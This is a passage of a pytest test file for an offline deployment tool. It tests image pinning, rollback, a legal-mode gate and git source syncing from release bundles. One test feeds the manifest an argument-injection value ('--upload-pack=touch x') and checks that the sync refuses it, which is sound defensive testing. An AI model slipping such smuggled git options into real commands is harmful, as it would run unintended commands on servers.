    state = tmp_path / "state" / "journal.json"
    journal = json.loads(state.read_text())
    journal["baseline"]["image_ref"] = "cb-test-open_notebook"
    state.write_text(json.dumps(journal))
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert fake_docker.get()["images"]["cb-test-open_notebook:latest"] == IMAGE_ID
    assert 'image: "cb-test-open_notebook:latest"' in (deploy / OP.PIN_FILE).read_text()


def test_rollback_without_a_journal_after_moving_a_damaged_one_aside(
    deployment, fake_docker, tmp_path
):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0
    state = tmp_path / "state"
    tag = _journal(tmp_path)["rollback_tag"]
    (state / "journal.json").write_text("{")
    (state / "journal.json.bak").write_text("{")
    assert (
        _rollback(conf, "app", "--to-image", tag) == OP.EXIT_UPDATE
    )  # still refused: no blind reset
    (state / "journal.json").rename(state / "journal.damaged.json")
    (state / "journal.json.bak").rename(state / "journal.damaged.bak")
    assert _rollback(conf, "app", "--to-image", tag) == 0
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_after_a_pin_points_the_deployment_back(
    completed, fake_docker, tmp_path
):
    conf, _, deploy = completed
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert _rollback(conf) == 0
    assert fake_docker.get()["images"]["chatbot5400:local"] == OLD_ID
    assert _journal(tmp_path)["pin"]["applied"] is False
    _plain_compose_up(
        deploy, "docker-compose.yml", OP.PIN_FILE
    )  # the pin file stays valid
    assert fake_docker.app()["image_id"] == OLD_ID and _status(conf) == 0


def test_pin_undo_and_backup_of_an_existing_file(completed, fake_docker, tmp_path):
    conf, _, deploy = completed
    pin_file = deploy / OP.PIN_FILE
    pin_file.write_text("# the operator's own file\n")
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    backups = list((tmp_path / "state" / "config-backups").rglob(OP.PIN_FILE))
    assert len(backups) == 1 and backups[0].read_text() == "# the operator's own file\n"
    assert OP.main(["pin", "--config", str(conf), "--undo"]) == 0
    assert pin_file.read_text() == "# the operator's own file\n"
    assert fake_docker.get()["images"]["chatbot5400:local"] == OLD_ID
    assert OP.main(["pin", "--config", str(conf), "--undo"]) == 0  # idempotent

    pin_file.unlink()
    assert OP.main(["pin", "--config", str(conf), "--apply"]) == 0
    assert OP.main(["pin", "--config", str(conf), "--undo"]) == 0
    assert not pin_file.exists()


def test_drift_is_checked_for_a_rolled_back_deployment(completed, fake_docker):
    conf, _, deploy = completed
    assert _rollback(conf) == 0
    assert _status(conf) == 0
    command = (
        Path(OP.load_config(str(conf))["STATE_DIR"]) / "compose-command.txt"
    ).read_text()
    assert (
        "rollback-"
        in (
            Path(OP.load_config(str(conf))["STATE_DIR"]) / "image-override.yml"
        ).read_text()
    )
    assert "--pull never" in command
    # somebody starts the new image again by hand
    fake_docker.edit(lambda s: s["containers"]["c1"].update(image_id=IMAGE_ID))
    assert _status(conf) == OP.EXIT_DRIFT


# --- F-23: the Legal gate keeps the network mode ----------------------------------


def test_legal_gate_keeps_normal_mode(completed, fake_docker, tmp_path):
    conf, _, _ = completed
    start = len(fake_docker.calls())
    assert _rollback(conf, "legal-on") == 0
    up = _ups(fake_docker, start)[-1]
    assert not any("maintenance" in x for x in up)
    app = fake_docker.app()
    assert app["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "true"
    assert app["env"]["OCR_OFFLINE"] == "true" and app["image_id"] == IMAGE_ID
    assert app["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    assert _status(conf) == 0
    assert _rollback(conf, "legal-off") == 0
    assert fake_docker.app()["env"]["OCR_LEGAL_NORMALIZATION_ENABLED"] == "false"
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    _assert_safe_calls(fake_docker.calls()[start:])


def test_legal_gate_keeps_maintenance_mode(deployment, fake_docker):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir) == 0  # in maintenance, awaiting approval
    assert _rollback(conf, "legal-on") == 0
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert _rollback(conf, "legal-off", "--no-maintenance") == 0  # explicit decision
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "0.0.0.0"
    assert _rollback(conf, "legal-on", "--maintenance") == 0
    assert fake_docker.app()["ports"]["8502/tcp"][0]["HostIp"] == "127.0.0.1"
    assert (
        _rollback(conf, "legal-on", "--maintenance", "--no-maintenance")
        == OP.EXIT_USAGE
    )


def test_legal_mode_rollback_via_gate_on_a_fresh_deployment(
    deployment, fake_docker, tmp_path
):
    conf, _, _ = deployment
    start = len(fake_docker.calls())
    assert _rollback(conf, "legal-off") == 0
    override = (tmp_path / "state" / "image-override.yml").read_text()
    assert 'OCR_LEGAL_NORMALIZATION_ENABLED: "false"' in override
    assert fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    _assert_safe_calls(fake_docker.calls()[start:])


# --------------------------------------------------------------------------- #
# source synchronisation with real git (F-05, F-24b)
# --------------------------------------------------------------------------- #


def _server_checkout(tmp_path, repo, name="server"):
    """What an offline server has: a checkout that stopped at v1.2.0."""
    server = tmp_path / name
    server.mkdir()
    _git(server, "init", "-q", "-b", "deploy")
    _git(server, "config", "user.email", "ops@example.invalid")
    _git(server, "config", "user.name", "ops")
    _git(server, "fetch", "-q", str(repo), "refs/tags/v1.2.0:refs/tags/v1.2.0")
    _git(server, "merge", "-q", "--ff-only", "v1.2.0")
    (server / ".env").write_text("SURREAL_PASSWORD=do-not-read\n")
    (server / "docker-compose.override.yml").write_text("# local, untracked\n")
    return server


def _sync(conf, server, pkg_dir, manifest=None):
    cfg = OP.load_config(str(conf))
    cfg["DEPLOY_DIR"] = str(server)
    manifest = manifest or OP.load_package(str(pkg_dir))
    OP.sync_source(OP.Deployment(cfg), Path(pkg_dir), manifest)
    return manifest


def test_sync_source_fast_forwards_and_fetches_only_the_release_ref(
    deployment, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    refs_before = set(_git(server, "for-each-ref", "--format=%(refname)").splitlines())
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert (
        _git(server, "symbolic-ref", "--short", "HEAD") == "deploy"
    )  # still on its branch
    assert (server / "VERSION").read_text() == "1.3.0\n"
    assert (server / ".env").read_text() == "SURREAL_PASSWORD=do-not-read\n"
    assert (
        server / "docker-compose.override.yml"
    ).read_text() == "# local, untracked\n"
    new_refs = (
        set(_git(server, "for-each-ref", "--format=%(refname)").splitlines())
        - refs_before
    )
    assert new_refs == {
        "refs/cb5400-offline/incoming/1.3.0-rc.1",
        "refs/tags/v1.3.0-rc.1",
    }
    _sync(conf, server, pkg_dir)  # idempotent


def test_sync_source_on_a_detached_head(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    _git(server, "checkout", "-q", "--detach", "v1.2.0")
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert _git(server, "rev-parse", "deploy") == _git(
        server, "rev-parse", "v1.2.0"
    )  # branch not moved


def test_sync_source_refuses_diverged_history(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    (server / "local.txt").write_text("site patch\n")
    _git(server, "add", "local.txt")
    _git(server, "commit", "-qm", "local commit")
    head = _git(server, "rev-parse", "HEAD")
    with pytest.raises(OP.Refused, match="diverges"):
        _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == head and (server / "local.txt").exists()


def test_sync_source_never_overwrites_local_modifications(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    (server / "app.py").write_text(
        "print('hot fix on the server')\n"
    )  # the release changes it too
    with pytest.raises(OP.Refused):
        _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == head
    assert (server / "app.py").read_text() == "print('hot fix on the server')\n"
    # an edit the release does not touch is carried over untouched
    _git(server, "checkout", "--", "app.py")
    (server / "README.md").write_text("site notes\n")
    manifest = _sync(conf, server, pkg_dir)
    assert _git(server, "rev-parse", "HEAD") == manifest["source"]["commit"]
    assert (server / "README.md").read_text() == "site notes\n"


def test_sync_source_refuses_a_wrong_commit(deployment, repo, tmp_path):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    manifest = OP.load_package(str(pkg_dir))
    manifest["source"]["commit"] = _git(
        repo, "rev-parse", "v1.2.0"
    )  # a real commit, not the bundled one
    with pytest.raises(OP.Refused, match="release commit"):
        _sync(conf, server, pkg_dir, manifest)
    manifest["source"]["commit"] = "--upload-pack=touch x"
    with pytest.raises(OP.Refused):
        _sync(conf, server, pkg_dir, manifest)
    assert _git(server, "rev-parse", "HEAD") == head
    assert _git(server, "for-each-ref", "refs/cb5400-offline") == ""


def test_sync_source_refuses_an_invalid_bundle_and_a_bundle_without_the_ref(
    deployment, repo, tmp_path
):
    conf, pkg_dir, _ = deployment
    server = _server_checkout(tmp_path, repo)
    head = _git(server, "rev-parse", "HEAD")
    manifest = OP.load_package(str(pkg_dir))
    rel = manifest["source"]["git_bundle"]

    broken = tmp_path / "broken"
    (broken / rel).parent.mkdir(parents=True)
    (broken / rel).write_bytes((pkg_dir / rel).read_bytes()[:200] + b"garbage")
    with pytest.raises(OP.Refused):
        _sync(conf, server, broken, manifest)

    other = tmp_path / "other"
    (other / rel).parent.mkdir(parents=True)
    _git(
        repo, "bundle", "create", str(other / rel), "v1.2.0..main"
    )  # a branch, not our ref
    with pytest.raises(OP.Refused, match="release commit under the manifest's ref"):
        _sync(conf, server, other, manifest)

    # a bundle whose base the server does not have (wrong base)
    orphan = tmp_path / "orphan-server"
    orphan.mkdir()
    _git(orphan, "init", "-q", "-b", "deploy")
    _git(orphan, "config", "user.email", "o@example.invalid")
    _git(orphan, "config", "user.name", "o")
    (orphan / "x").write_text("x")
    _git(orphan, "add", ".")
    _git(orphan, "commit", "-qm", "unrelated")
    with pytest.raises(OP.Refused):
        _sync(conf, orphan, pkg_dir, manifest)

    assert _git(server, "rev-parse", "HEAD") == head
    assert _git(server, "for-each-ref", "refs/cb5400-offline") == ""


@pytest.fixture
def git_deployment(tmp_path, package, fake_docker, repo, health_server, monkeypatch):
    pkg, digest = package
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    server = _server_checkout(tmp_path, repo, "deploy-git")
    conf = _write_conf(tmp_path, server, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    return conf, pkg_dir, server


def test_update_with_source_sync_and_rollback_restores_the_commit(
    git_deployment, fake_docker, repo, tmp_path
):
    conf, pkg_dir, server = git_deployment
    v120 = _git(server, "rev-parse", "HEAD")
    assert _apply(conf, pkg_dir, "--sync-source") == 0
    journal = _journal(tmp_path)
    release = _git(repo, "rev-parse", "HEAD")
    assert _git(server, "rev-parse", "HEAD") == release
    assert journal["source"] == {
        "previous_commit": v120,
        "previous_branch": "deploy",
        "target_commit": release,
    }
    assert journal["baseline"]["source_commit"] == v120
    # F-24b: the application AND its source go back together
    assert _rollback(conf) == 0
    assert _git(server, "rev-parse", "HEAD") == v120
    assert (server / "VERSION").read_text() == "1.2.0\n"
    assert _git(server, "rev-parse", "deploy") == release  # the branch is not rewritten
    assert (server / ".env").read_text() == "SURREAL_PASSWORD=do-not-read\n"
    assert fake_docker.app()["image_id"] == OLD_ID


def test_rollback_does_not_move_a_source_tree_with_local_changes(
    git_deployment, fake_docker, repo, tmp_path, capsys
):
    conf, pkg_dir, server = git_deployment
    assert _apply(conf, pkg_dir, "--sync-source") == 0
    release = _git(server, "rev-parse", "HEAD")
    (server / "README.md").write_text("edited after the update\n")
    capsys.readouterr()
    assert _rollback(conf) == 0  # the application is rolled back...
    assert fake_docker.app()["image_id"] == OLD_ID
    assert _git(server, "rev-parse", "HEAD") == release  # ...the source is left alone
    assert (server / "README.md").read_text() == "edited after the update\n"
    assert "source NOT moved" in capsys.readouterr().out


def test_compose_file_changed_by_the_source_sync_cannot_touch_the_database(
    fake_docker, repo, tmp_path, health_server, monkeypatch
):
    """F-21: the baseline is taken BEFORE the source sync, so a release whose
    compose file changes the database service is refused before any recreate."""
    (repo / "docker-compose.yml").write_text(
        "# x-evil-db: this release moves the database image\n"
    )
    _git(repo, "add", ".")
    _git(repo, "commit", "-qm", "release with a compose change")
    pkg, digest = _build(repo, tmp_path)
    pkg_dir = _unpack_on_server(fake_docker, pkg, digest, tmp_path / "pkgx")
    server = _server_checkout(tmp_path, repo, "deploy-git")
    conf = _write_conf(tmp_path, server, health_server)
    monkeypatch.setattr(OP.time, "sleep", lambda s: None)
    assert _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
    assert not _ups(fake_docker) and fake_docker.app()["image_id"] == OLD_ID
    assert fake_docker.get()["containers"]["db1"]["id"] == "db-container-original"
    # the interrupted attempt is undone: application untouched (not even restarted), source back at v1.2.0
    assert _rollback(conf, "interrupted") == 0
    assert not _ups(fake_docker)
    assert _git(server, "rev-parse", "HEAD") == _git(repo, "rev-parse", "v1.2.0")
    assert not (server / "docker-compose.yml").exists()


def test_attempt_is_not_resumed_across_a_source_sync(
    git_deployment, fake_docker, repo, tmp_path
):
    """After the source moved, the configuration on disk is the release's: a resumed
    run would compare the database service against the wrong side. The attempt is
    closed (application untouched, source back) and started again."""
    conf, pkg_dir, server = git_deployment
    v120 = _git(server, "rev-parse", "HEAD")
    fake_docker.edit(lambda s: s["rapidocr"].update(copied={}, on_volume=[]))
    assert (
        _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
    )  # stops after K, before the recreate
    assert _git(server, "rev-parse", "HEAD") != v120
    assert (
        _apply(conf, pkg_dir, "--sync-source", "--accept-missing-rapidocr")
        == OP.EXIT_UPDATE
    )
    assert not _ups(fake_docker)
    assert _rollback(conf, "interrupted") == 0
    assert not _ups(fake_docker) and _git(server, "rev-parse", "HEAD") == v120
    assert _apply(conf, pkg_dir, "--sync-source", "--accept-missing-rapidocr") == 0
    assert fake_docker.app()["image_id"] == IMAGE_ID


def test_sync_source_needs_a_git_checkout(deployment):
    conf, pkg_dir, _ = deployment
    assert _apply(conf, pkg_dir, "--sync-source") == OP.EXIT_UPDATE
